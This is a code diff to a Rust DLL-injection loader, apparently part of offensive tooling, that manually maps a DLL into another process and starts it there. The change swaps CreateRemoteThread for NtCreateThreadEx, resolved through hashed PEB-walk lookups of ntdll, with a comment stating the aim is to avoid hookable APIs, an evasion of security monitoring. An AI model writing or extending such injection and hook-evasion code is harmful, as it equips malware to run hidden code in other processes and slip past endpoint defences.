@@ -18,8 +18,7 @@ use winapi::um::winnt::{
     PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_NOACCESS, PAGE_READONLY, PAGE_READWRITE,
     PROCESS_ALL_ACCESS,
 };
-use winapi::um::processthreadsapi::{CreateRemoteThread, OpenProcess};
-use winapi::um::handleapi::CloseHandle;
+use winapi::um::processthreadsapi::OpenProcess;
 use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
 use pe_resolve;
 
@@ -658,7 +657,7 @@ pub unsafe fn load_dll_in_memory(dll_bytes: &[u8]) -> Result<*mut c_void> {
 ///    the same base address in every process (per-boot ASLR, shared between
 ///    all processes via copy-on-write), so the resolved function addresses are
 ///    correct for the remote process.
-/// 5. **Starts the DLL entry point** via `CreateRemoteThread`.  The call is
+/// 5. **Starts the DLL entry point** via `NtCreateThreadEx` (resolved via PEB walk).
 ///    fire-and-forget: the returned thread handle is closed immediately after
 ///    creation.
 ///
@@ -974,25 +973,52 @@ pub unsafe fn load_dll_in_remote_process(
             &mut old_prot,
         );
 
-        let thread_start: winapi::um::minwinbase::LPTHREAD_START_ROUTINE =
-            std::mem::transmute(stub_mem as usize);
-        let thread = CreateRemoteThread(
+        // M-27: Use NtCreateThreadEx via PEB walk instead of hookable CreateRemoteThread.
+        let ntdll_hash: u32 = pe_resolve::hash_str(b"ntdll.dll\0");
+        let ntdll_base = pe_resolve::get_module_handle_by_hash(ntdll_hash)
+            .ok_or_else(|| anyhow!("manual_map: ntdll not found via PEB walk"))?;
+        let ntcreate_hash = pe_resolve::hash_str(b"NtCreateThreadEx\0");
+        let ntcreate_addr = pe_resolve::get_proc_address_by_hash(ntdll_base, ntcreate_hash)
+            .ok_or_else(|| anyhow!("manual_map: NtCreateThreadEx not found via PEB walk"))?;
+
+        type NtCreateThreadExFn = unsafe extern "system" fn(
+            *mut *mut winapi::ctypes::c_void, // ThreadHandle
+            u32,                               // DesiredAccess
+            *mut winapi::ctypes::c_void,       // ObjectAttributes
+            *mut winapi::ctypes::c_void,       // ProcessHandle
+            *mut winapi::ctypes::c_void,       // StartRoutine
+            *mut winapi::ctypes::c_void,       // Argument
+            u32,                               // CreateFlags
+            usize,                             // ZeroBits
+            usize,                             // StackSize
+            usize,                             // MaximumStackSize
+            *mut winapi::ctypes::c_void,       // AttributeList
+        ) -> i32;
+        let nt_create_thread: NtCreateThreadExFn =
+            std::mem::transmute(ntcreate_addr as *const ());
+
+        let mut h_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
+        let status = nt_create_thread(
+            &mut h_thread,
+            0x1FFFFF,              // THREAD_ALL_ACCESS
+            std::ptr::null_mut(),
             target_process,
+            stub_mem,
             std::ptr::null_mut(),
+            0,                     // No creation flags — run immediately
             0,
-            thread_start,
-            std::ptr::null_mut(),
+            0,
             0,
             std::ptr::null_mut(),
         );
-        if thread.is_null() {
+        if status < 0 || h_thread.is_null() {
             return Err(anyhow!(
-                "CreateRemoteThread failed: {}",
-                std::io::Error::last_os_error()
+                "NtCreateThreadEx for DllMain stub failed: {:x}",
+                status
             ));
         }
         // Close the thread handle immediately; we don't wait for it.
-        CloseHandle(thread);
+        pe_resolve::close_handle(h_thread as *mut core::ffi::c_void);
     }
 
     Ok(remote_base)
